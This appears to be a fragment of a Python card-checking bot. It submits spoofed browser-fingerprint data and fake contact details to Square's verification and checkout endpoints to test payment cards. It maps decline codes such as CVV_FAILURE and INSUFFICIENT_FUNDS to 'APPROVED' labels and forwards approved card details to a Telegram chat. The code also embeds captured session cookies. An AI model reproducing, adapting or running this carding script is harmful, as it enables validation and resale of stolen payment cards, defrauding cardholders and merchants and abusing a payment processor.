                'payload_json': '{"components":{"language":"es","color_depth":24,"resolution":[1366,768],"available_resolution":[1366,738],"timezone_offset":300,"session_storage":1,"local_storage":1,"cpu_class":"unknown","navigator_platform":"Win32","do_not_track":"unknown","regular_plugins":["PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Chrome PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Chromium PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Microsoft Edge PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","WebKit built-in PDF::Portable Document Format::application/pdf~pdf,text/pdf~pdf"],"adblock":false,"has_lied_languages":false,"has_lied_resolution":false,"has_lied_os":false,"has_lied_browser":false,"touch_support":[0,false,false],"js_fonts":["Arial","Arial Black","Arial Narrow","Calibri","Cambria","Cambria Math","Comic Sans MS","Consolas","Courier","Courier New","Georgia","Helvetica","Impact","Lucida Console","Lucida Sans Unicode","Microsoft Sans Serif","MS Gothic","MS PGothic","MS Sans Serif","MS Serif","Palatino Linotype","Segoe Print","Segoe Script","Segoe UI","Segoe UI Light","Segoe UI Semibold","Segoe UI Symbol","Tahoma","Times","Times New Roman","Trebuchet MS","Verdana","Wingdings","Wingdings 2","Wingdings 3"]},"fingerprint":"3e9f4502176cd3958a3bb800711b2363"}',
                'payload_type': 'fingerprint-v1-sans-ua',
            },
        ],
        'browser_profile': {
            'components': '{"user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0","language":"es","color_depth":24,"resolution":[1366,768],"available_resolution":[1366,738],"timezone_offset":300,"session_storage":1,"local_storage":1,"cpu_class":"unknown","navigator_platform":"Win32","do_not_track":"unknown","regular_plugins":["PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Chrome PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Chromium PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Microsoft Edge PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","WebKit built-in PDF::Portable Document Format::application/pdf~pdf,text/pdf~pdf"],"adblock":false,"has_lied_languages":false,"has_lied_resolution":false,"has_lied_os":false,"has_lied_browser":false,"touch_support":[0,false,false],"js_fonts":["Arial","Arial Black","Arial Narrow","Calibri","Cambria","Cambria Math","Comic Sans MS","Consolas","Courier","Courier New","Georgia","Helvetica","Impact","Lucida Console","Lucida Sans Unicode","Microsoft Sans Serif","MS Gothic","MS PGothic","MS Sans Serif","MS Serif","Palatino Linotype","Segoe Print","Segoe Script","Segoe UI","Segoe UI Light","Segoe UI Semibold","Segoe UI Symbol","Tahoma","Times","Times New Roman","Trebuchet MS","Verdana","Wingdings","Wingdings 2","Wingdings 3"]}',
            'fingerprint': '8119a85c0b1d71d1cedeb009d89b3e3e',
            'timezone': '300',
            'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0',
            'version': '64a2cdcfed83c8465ab0f75c37a07bb075ed9d5a',
            'website_url': 'https://checkout.square.site/',
        },
        'client_id': 'sq0idp-w46nJ_NCNDMSOywaCY0mwA',
        'payment_source': cnon,
        'universal_token': {
            'token': location,
            'type': 'UNIT',
        },
        'verification_details': {
            'billing_contact': {
                'country': 'US',
                'email': 'uhmbwkmlkfvxh@internetkeno.com',
                'phone': '+12486354657',
                'postal_code': None,
            },
            'intent': 'CHARGE',
            'total': {
                'amount': 100,
                'currency': 'USD',
            },
        },
    }

    response = session.post(
        'https://connect.squareup.com/v2/analytics/verifications',
        headers=headers,
        json=json_data,
    ).json()
                
    verf = response['token']

    print(verf)

    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'es,es-ES;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
        'content-type': 'application/json',
        # 'cookie': 'pay_link_user_site=KA1N4E7NPR4D7%3A; _sp_ses.7acb=*; square-sync-csrf=eyJpdiI6ImMzUWFJNG55TFB1YTRSeTQyenVsYVE9PSIsInZhbHVlIjoiOENJVlM1dC8wd0lNNjlOQVpzeU5rYmFRUms2cmU1a0pBN2t2TGVEZjMraHlVdVAyNjVtNE9nQkZjUEtwZVlreWxCVjhWOXh1eDNFdTlJNjMwUlR6OHpkYVFNUXMxYVkrekh5L0ZLSUhzZUNTTFdKaWtBbTMwclpYcVZkeFJlc2siLCJtYWMiOiI4YzBmZTE2MGQ3MDVkOTA3NmIxZjM3MTQwZmJiMmE5YjJjNDJlNjUwNDQzNzlmYTIwNTQ5MTE2NWYyZDBkMmNhIiwidGFnIjoiIn0%3D; square-sync_session=eyJpdiI6IjRJTnpPZnBkNytPaUtocmlhbFZ6Q2c9PSIsInZhbHVlIjoiOTR1WUpRMGJuRUJJK0UyU241ZThlS1BjSXFwUFNCL2hHL3d3MmlYcHhYYThzWlQzZTQ5Nm9ndXVZRFdSdWhHU20yNXNGZjI1Z0Y2Y09ORjVrNzRWZ04yS1Q0WURsVFJNZS9OQ2c0eWVVOGdNdThSTlBFR2d3NnV5ZGYxWVNEdEYiLCJtYWMiOiI2ZTRiNDZmNTM5NGU1ZWMxNDcyMjFkN2FiODJmZmM2YWI5OTRiNzlhZmRkY2RlYWU1Y2VmYTU1MTEyZjk3ZjU1IiwidGFnIjoiIn0%3D; merchant:KA1N4E7NPR4D7:order:LeB2TgYTAYv3TkA7WKK1ji6kcVZYMd4kqk:locale=es; customer_xsrf=eyJpdiI6IngwSGU2UjlGUC9zNWxSSHBwNWkrQlE9PSIsInZhbHVlIjoibWtxVnBnbHRXeTVXYzZUMVMycklQVzJseC9HM0RrNFNGWjJUMGRBeFFZckQwYnZJQXJ1MlVOa1FwZFk0OWJEZzBIMHJTTnlHZ05scWNpSWdRTXo0WTBCREtRQ1RtdDB2WjJ3bVV5N05MTVFmdHZycjJmZjhGNS9TQkdPNFFwNE4iLCJtYWMiOiIxMzcxNGYxZDFkZDQ0YjQ5MDZjZDkyZjg3MGM2YjAwMzQzMDIwZDgzNTg0YTQyMzFmNzI4NzYxMjJmYTE0MTc0IiwidGFnIjoiIn0%3D; customer_session=eyJpdiI6Ik5WQUJNK29hcFBpeDV1bHRxdnlOR1E9PSIsInZhbHVlIjoiVmc3RldzUlh0ZFZMNjdJZjUyUmdCUGN5R3VHcFBuVGdPU1hCRkF0SWhWbW0zQVVUMGJpZDFFNVNyS2h2eUJMSk1icnBiZ0gzdy85bm5lbWlzLzhrZkhuQlVTaktvRlZwRTVPMFZWWHpiVzJRSkpjSFBGdmtwcTBYNW9YRXVucE4iLCJtYWMiOiJlMDljZmZkMmJlNjdlZTIyNzNiZDczNjRlOTliODk3MGMwZDM0ZTc2NGQwYmVkZWM3ZmU1MWU4OWNlMTk0MThkIiwidGFnIjoiIn0%3D; __cf_bm=Lh6ngxqo71AeWjUKe8ZsGnuVgVASQtezbQ.6jZQ5OQk-1715574799-1.0.1.1-S4BCU24taAI4xKBigr.lpMn5Wk2Y6fhD0dy4CjI_GkfzQkx6O4HhFA5weEyb_swUVBU8Wp0.rIqDVG1if3mxZw; _sp_id.7acb=4d4b7963-7474-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZVdd359d56-89b3-4185-b71d-377b68fc3d2d&created=1715572964153&expire=1715576084752',
        'origin': 'https://checkout.square.site',
        'priority': 'u=1, i',
        'referer': 'https://checkout.square.site/merchant/KA1N4E7NPR4D7/checkout/BXFZIPLP2NMENC6AKDMWJNOK',
        'sec-ch-ua': '"Chromium";v="124", "Microsoft Edge";v="124", "Not-A.Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0',

    }

    json_data = {
        'nonce': cnon,
        'buyer_verification_token': verf,
        'buyer_postal_code': None,
        'create_stored_payment_method': False,
        'country': 'US',
    }

    response = session.post(
        f'https://checkout.square.site/api/soc-platform/merchant/KA1N4E7NPR4D7/location/{location}/order/{order}/checkout',
        headers=headers,
        json=json_data,
    ).text

    code = parseX(response, '"errors":[{"code":"', '"')

    if "CVV_FAILURE" in code:
            msg = "APPROVED CCN✅"
            respuesta = code
            
    elif "VERIFY_CVV_FAILURE" in code:
            msg = "APPROVED CCN✅"
            respuesta = code
        
    elif "TRANSACTION_LIMIT" in code:
            msg = "APPROVED ✅"
            respuesta = code
            
    elif "INSUFFICIENT_FUNDS" in code:
            msg = "APPROVED ✅"
            respuesta = code
            
    elif "ADDRESS_VERIFICATION_FAILURE" in code:
            msg = "APPROVED AVS✅"
            respuesta = code
        
    elif "VERIFY_AVS_FAILURE" in code:
            msg = "APPROVED AVS✅"
            respuesta = code

    else:
            msg = "DECLINED ❌"
            respuesta = code
            
    proxyy = "LIVE 🟩"
    gateway = f'<code>{name_gate} {subtype}</code>'
    end = time.time()
    tiempo = str(inicio - end)[1:5]
    session.close()  
    if "APPROVED" in msg:
        
        chat_id = -1002000802973
    
        client.send_message(chat_id, check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy))
        
    return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)
    